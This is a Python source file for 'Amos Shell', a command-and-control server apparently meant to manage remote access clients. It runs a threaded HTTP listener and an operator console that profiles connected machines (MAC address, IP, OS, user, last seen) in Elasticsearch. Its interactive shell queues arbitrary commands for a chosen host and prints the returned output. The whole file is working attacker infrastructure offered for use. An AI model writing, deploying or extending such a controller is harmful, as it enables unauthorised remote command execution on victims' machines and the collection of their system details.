import time
import threading
from termcolor import colored
from http.server import ThreadingHTTPServer
import HttpHandler
from server_settings import (
    SERVER_IP, SERVER_PORT, ES_HANDLER,
    CONNECTED_CLIENTS, client_lock,
    command_queue, response_storage, response_lock,
    get_next_cmd_id, COMMAND_RESPONSE_TIMEOUT, CLIENT_ALIVE_TIMEOUT
)


art = """
 █████╗ ███╗   ███╗ ██████╗ ███████╗      ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗████╗ ████║██╔═══██╗██╔════╝      ██╔════╝██║  ██║██╔════╝██║     ██║     
███████║██╔████╔██║██║   ██║███████╗█████╗███████╗███████║█████╗  ██║     ██║     
██╔══██║██║╚██╔╝██║██║   ██║╚════██║╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║██║ ╚═╝ ██║╚██████╔╝███████║      ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝      ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
"""


class AmosServer:
    def __init__(self):
        self.server = ThreadingHTTPServer((SERVER_IP, SERVER_PORT), HttpHandler.MyHandler)
        self.running = True
        self.http_thread = None
        self.client_cwd = None


    # Start the HTTP server in a background daemon thread.
    def start_background_server(self):
        self.http_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.http_thread.start()
        print(f"[*] HTTP server started on {SERVER_IP}:{SERVER_PORT} (background)")
 

    @staticmethod
    def convert_text(text):
        return colored(text, "cyan", attrs=["bold"])


    # Main Interactive shell
    def shell_interface(self):
        print("[*] Amos Shell started. Type 'guide' for commands.\n")
        self.show_commands()

        while self.running:
            try:
                cmd = input(self.convert_text("AMOS: ")).strip()
                if not cmd:
                    continue
                parts = cmd.split()
                base_cmd = parts[0].lower()

                if base_cmd == "guide":
                    self.show_commands()

                elif base_cmd == "clients":
                    ES_HANDLER.retrieve_client_information()

                elif base_cmd == "connected":
                    now = time.time()
                    stale_keys = []
                    with client_lock:
                        # Remove stale clients
                        for cid, info in CONNECTED_CLIENTS.items():
                            if now - info['last_seen'] > CLIENT_ALIVE_TIMEOUT:
                                stale_keys.append(cid)
                        for cid in stale_keys:
                            del CONNECTED_CLIENTS[cid]
                        # Build a list of client data with last_seen
                        connected_list = []
                        for cid, info in CONNECTED_CLIENTS.items():
                            # Get the full client document from ES
                            client_data = ES_HANDLER.get_client_data(cid)
                            if client_data:
                                client_data['_source']['last_seen'] = time.ctime(info['last_seen'])
                                connected_list.append(client_data)
                    if connected_list:
                        ES_HANDLER.pt.field_names = ["Client ID", "Mac Address", "IP", "System", "Node Name",
                                                     "Release", "Version", "Machine", "Date-Joined",
                                                     "Time-Joined", "User", "Last Seen"]
                        for hit in connected_list:
                            src = hit['_source']
                            ES_HANDLER.pt.add_row([
                                hit['_id'],
                                src.get("mac-address"),
                                src.get("ip"),
                                src.get("os"),
                                src.get("system-name"),
                                src.get("release"),
                                src.get("version"),
                                src.get("machine"),
                                src.get("date-joined"),
                                src.get("time-joined"),
                                src.get("user"),
                                src.get("last_seen")
                            ])
                        print(ES_HANDLER.pt)
                        ES_HANDLER.pt.clear()
                    else:
                        print("[-] No connected clients.")

                elif base_cmd == "shell":
                    if len(parts) < 2:
                        print("[+] Usage: shell <client_id>")
                        continue
                    client_id = parts[1]
                    # Check if client exists in CONNECTED_CLIENTS (optional)
                    with client_lock:
                        if client_id not in CONNECTED_CLIENTS:
                            print(f"[-] Client '{client_id}' not connected.")
                            continue
                    self.interactive_shell(client_id)

                elif base_cmd == "delete":
                    if len(parts) < 2:
                        print("[-] Usage: delete <client_id>  or  delete all")
                        continue
                    if parts[1].lower() == "all":
                        confirm = input("[!] Are you sure you want to delete ALL documents? (y/n): ")
                        if confirm.lower() == "y":
                            ES_HANDLER.delete_all_docs()
                    else:
                        ES_HANDLER.delete_doc(parts[1])

                elif base_cmd == "get":
                    if len(parts) < 2:
                        print("[-] Usage: get <client_id>")
                        continue
                    ES_HANDLER.retrieve_client_document(parts[1])

                elif base_cmd == "show":
                    if len(parts) < 3 or parts[1].lower() != "fields":
                        print("[-] Usage: show fields <client_id>")
                        continue
                    ES_HANDLER.show_fields(parts[2])

                elif base_cmd == "fields":
                    if len(parts) < 3:
                        print("[-] Usage: fields <client_id> <field_name>")
                        continue
                    ES_HANDLER.get_field(parts[1], parts[2])

                elif base_cmd == "exit":
                    print("[!] Shutting down Amos server...")
                    self.running = False
                    self.server.shutdown()
                    self.server.server_close()
                    break

                else:
                    print("[-] Unknown command. Type 'guide' for help.")

            except KeyboardInterrupt:
                print("\n[!] Interrupted. Shutting down...")
                self.running = False
                self.server.shutdown()
                self.server.server_close()
                break
            except Exception as e:
                print(f"[-] Error: {e}")


    # Request current working directory from the client
    def get_client_cwd(self, client_id, timeout=COMMAND_RESPONSE_TIMEOUT):
        cmd_id = get_next_cmd_id()
        command_queue.put((client_id, "cd", cmd_id))
        print("[*] Fetching current working directory...")
        start = time.time()
        while time.time() - start < timeout:
            with response_lock:
                if cmd_id in response_storage:
                    return response_storage.pop(cmd_id).strip()
            time.sleep(0.2)
        return None


    # Interactive shell session with a selected client
    def interactive_shell(self, client_id):
        print(f"[+] Entering interactive shell with {client_id}. Type 'exit' to return.")
        self.client_cwd = HttpHandler.CWD or self.get_client_cwd(client_id) or "~"

        while self.running:
            try:
                cmd = input(f"{self.convert_text(client_id)}~[{HttpHandler.CWD}]: ").strip()
                if not cmd:
                    continue

                if cmd.lower() == "exit":
                    print("[+] Exiting interactive shell.")
                    break

                elif cmd.lower() == "guide":
                    self.show_commands()
                    continue

                # Generate command ID
                cmd_id = get_next_cmd_id()
                # Queue the command
                command_queue.put((client_id, cmd, cmd_id))

                # Wait for response
                print(f"[*] Command sent (ID: {cmd_id}). Waiting for response...")
                start_time = time.time()
                response = None
                while time.time() - start_time < COMMAND_RESPONSE_TIMEOUT:
                    with response_lock:
                        if cmd_id in response_storage:
                            response = response_storage.pop(cmd_id)
                            break
                    time.sleep(0.2)  # small sleep to avoid busy-wait

                if response is not None:
                    if '&cwd=' in response:
                        response = response.split('&cwd=')[0]
                    print(f"[+] Response:\n{response}")

                else:
                    print(f"[-] Timeout waiting for response (ID: {cmd_id}).")

            except KeyboardInterrupt:
                print("\n[+] Exiting interactive shell.")
                break
            except Exception as e:
                print(f"[-] Error in interactive shell: {e}")


    @staticmethod
    def show_commands():
        help_text = """
        Amos Commands:
          guide                  - Show this help
          clients                - Show all clients in Elasticsearch index
          connected              - Show currently connected (alive) clients
          shell <client_id>      - Enter interactive shell with a client
          delete <client_id>     - Delete client document from Elasticsearch
          delete all             - Delete all client documents (confirm)
          get <client_id>        - Retrieve full document for client
          show fields <client_id> - List all field names for client
          fields <client_id> <field> - Show value of a specific field
          exit                   - Shutdown Amos server
        """
        print(help_text)


if __name__ == "__main__":
    print(art)
    server = AmosServer()
    server.start_background_server()
    server.shell_interface()
    print("[+] Amos server terminated.")



